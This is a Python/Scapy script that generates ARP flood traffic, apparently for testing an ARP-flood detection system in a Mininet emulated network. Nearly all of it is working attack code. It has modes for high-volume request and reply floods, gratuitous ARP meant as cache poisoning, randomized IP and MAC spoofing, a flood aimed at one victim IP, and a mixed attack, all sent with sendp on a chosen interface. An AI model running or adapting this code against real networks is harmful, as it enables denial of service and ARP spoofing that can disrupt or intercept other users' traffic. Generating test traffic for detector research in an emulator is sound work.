#!/usr/bin/env python3
"""
attack.py — ARP Flood Attack Generator
========================================
Run from inside a Mininet host xterm, e.g.:
    mininet> xterm h1
    # in h1 xterm:
    python3 /opt/p4work/arp_flood_detection/attack/attack.py \
        --mode basic --iface h1-eth0 --count 2000

Modes:
    normal      Low-rate legitimate ARP (normal traffic baseline)
    basic       High-volume single-source ARP request flood
    reply       Unsolicited ARP reply flood
    gratuitous  sender_ip == target_ip (cache poisoning indicator)
    ip_spoof    Randomized source IPs
    mac_spoof   Randomized source MACs
    targeted    All traffic aimed at one victim IP
    mixed       Random combination of all attack types
"""

import sys, time, random, argparse, logging
from scapy.all import Ether, ARP, sendp, get_if_hwaddr, conf
conf.verb = 0

logging.basicConfig(level=logging.INFO, format="%(asctime)s [ATK] %(message)s")
log = logging.getLogger("atk")

BCAST    = "ff:ff:ff:ff:ff:ff"
ZERO_MAC = "00:00:00:00:00:00"

def rnd_ip():
    return f"10.0.{random.randint(0,255)}.{random.randint(1,254)}"

def rnd_mac():
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))

def _send(pkts, iface, inter):
    """Send a list of packets or a single packet."""
    sendp(pkts, iface=iface, inter=inter, verbose=False)

# ── Attack implementations ────────────────────────────────────────────────────

def normal(iface, src_ip, src_mac, count, inter):
    log.info(f"NORMAL {src_ip} count={count}")
    for _ in range(count):
        dst = f"10.0.{random.randint(1,10)}.{random.randint(1,4)}"
        sendp(Ether(src=src_mac, dst=BCAST) /
              ARP(op=1, hwsrc=src_mac, psrc=src_ip,
                  hwdst=ZERO_MAC, pdst=dst),
              iface=iface, verbose=False)
        time.sleep(inter if inter > 0 else random.uniform(0.3, 1.5))

def basic(iface, src_ip, src_mac, dst_ip, count, inter):
    log.info(f"BASIC FLOOD {src_ip}→{dst_ip} count={count}")
    pkt = (Ether(src=src_mac, dst=BCAST) /
           ARP(op=1, hwsrc=src_mac, psrc=src_ip,
               hwdst=ZERO_MAC, pdst=dst_ip))
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)

def reply(iface, src_ip, src_mac, dst_ip, count, inter):
    log.info(f"REPLY FLOOD {src_ip}→{dst_ip} count={count}")
    pkt = (Ether(src=src_mac, dst=BCAST) /
           ARP(op=2, hwsrc=src_mac, psrc=src_ip,
               hwdst=BCAST, pdst=dst_ip))
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)

def gratuitous(iface, src_ip, src_mac, count, inter):
    log.info(f"GRATUITOUS FLOOD {src_ip} count={count}")
    pkt = (Ether(src=src_mac, dst=BCAST) /
           ARP(op=1, hwsrc=src_mac, psrc=src_ip,
               hwdst=BCAST, pdst=src_ip))   # target == sender
    sendp(pkt, iface=iface, count=count, inter=inter, verbose=False)

def ip_spoof(iface, src_mac, dst_ip, count, inter):
    log.info(f"IP SPOOF FLOOD →{dst_ip} count={count}")
    for _ in range(count):
        fip = rnd_ip()
        sendp(Ether(src=src_mac, dst=BCAST) /
              ARP(op=1, hwsrc=src_mac, psrc=fip,
                  hwdst=ZERO_MAC, pdst=dst_ip),
              iface=iface, verbose=False)
        if inter > 0: time.sleep(inter)

def mac_spoof(iface, src_ip, dst_ip, count, inter):
    log.info(f"MAC SPOOF FLOOD {src_ip}→{dst_ip} count={count}")
    for _ in range(count):
        fmac = rnd_mac()
        sendp(Ether(src=fmac, dst=BCAST) /
              ARP(op=1, hwsrc=fmac, psrc=src_ip,
                  hwdst=ZERO_MAC, pdst=dst_ip),
              iface=iface, verbose=False)
        if inter > 0: time.sleep(inter)

def targeted(iface, src_ip, src_mac, victim_ip, count, inter):
    log.info(f"TARGETED FLOOD {src_ip}→{victim_ip} count={count}")
    for _ in range(count):
        sendp(Ether(src=src_mac, dst=BCAST) /
              ARP(op=1, hwsrc=src_mac, psrc=src_ip,
                  hwdst=ZERO_MAC, pdst=victim_ip),
              iface=iface, verbose=False)
        if inter > 0: time.sleep(inter)

def mixed(iface, src_ip, src_mac, count, inter):
    log.info(f"MIXED FLOOD count={count}")
    targets = [f"10.0.{r}.{j}" for r in range(1,11) for j in range(1,5)]
    modes   = ["req","rep","grat","ip_spoof","mac_spoof"]
    for _ in range(count):
        t = random.choice(targets)
        m = random.choice(modes)
        if m == "req":
            pkt = Ether(src=src_mac,    dst=BCAST) / \
                  ARP(op=1, hwsrc=src_mac,  psrc=src_ip,  hwdst=ZERO_MAC, pdst=t)
        elif m == "rep":
            pkt = Ether(src=src_mac,    dst=BCAST) / \
                  ARP(op=2, hwsrc=src_mac,  psrc=src_ip,  hwdst=BCAST,    pdst=t)
        elif m == "grat":
            pkt = Ether(src=src_mac,    dst=BCAST) / \
                  ARP(op=1, hwsrc=src_mac,  psrc=src_ip,  hwdst=BCAST,    pdst=src_ip)
        elif m == "ip_spoof":
            fip = rnd_ip()
            pkt = Ether(src=src_mac,    dst=BCAST) / \
                  ARP(op=1, hwsrc=src_mac,  psrc=fip,     hwdst=ZERO_MAC, pdst=t)
        else:
            fmac = rnd_mac()
            pkt  = Ether(src=fmac,      dst=BCAST) / \
                   ARP(op=1, hwsrc=fmac,   psrc=src_ip,  hwdst=ZERO_MAC, pdst=t)
        sendp(pkt, iface=iface, verbose=False)
        if inter > 0: time.sleep(inter)

# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--mode",    required=True,
        choices=["normal","basic","reply","gratuitous",
                 "ip_spoof","mac_spoof","targeted","mixed"])
    ap.add_argument("--iface",   default="eth0")
    ap.add_argument("--src_ip",  default="10.0.1.1")
    ap.add_argument("--src_mac", default=None)
    ap.add_argument("--dst_ip",  default="10.0.2.1")
    ap.add_argument("--count",   type=int,   default=1000)
    ap.add_argument("--inter",   type=float, default=0.0)
    args = ap.parse_args()

    if args.src_mac is None:
        try:    args.src_mac = get_if_hwaddr(args.iface)
        except: args.src_mac = "00:11:22:33:44:55"

    log.info(f"iface={args.iface} src={args.src_ip}/{args.src_mac} "
             f"dst={args.dst_ip} count={args.count} inter={args.inter}")

    m = args.mode
    if   m == "normal":     normal(args.iface, args.src_ip, args.src_mac, args.count, args.inter)
    elif m == "basic":      basic(args.iface, args.src_ip, args.src_mac, args.dst_ip, args.count, args.inter)
    elif m == "reply":      reply(args.iface, args.src_ip, args.src_mac, args.dst_ip, args.count, args.inter)
    elif m == "gratuitous": gratuitous(args.iface, args.src_ip, args.src_mac, args.count, args.inter)
    elif m == "ip_spoof":   ip_spoof(args.iface, args.src_mac, args.dst_ip, args.count, args.inter)
    elif m == "mac_spoof":  mac_spoof(args.iface, args.src_ip, args.dst_ip, args.count, args.inter)
    elif m == "targeted":   targeted(args.iface, args.src_ip, args.src_mac, args.dst_ip, args.count, args.inter)
    elif m == "mixed":      mixed(args.iface, args.src_ip, args.src_mac, args.count, args.inter)

    log.info("Done.")

if __name__ == "__main__":
    main()
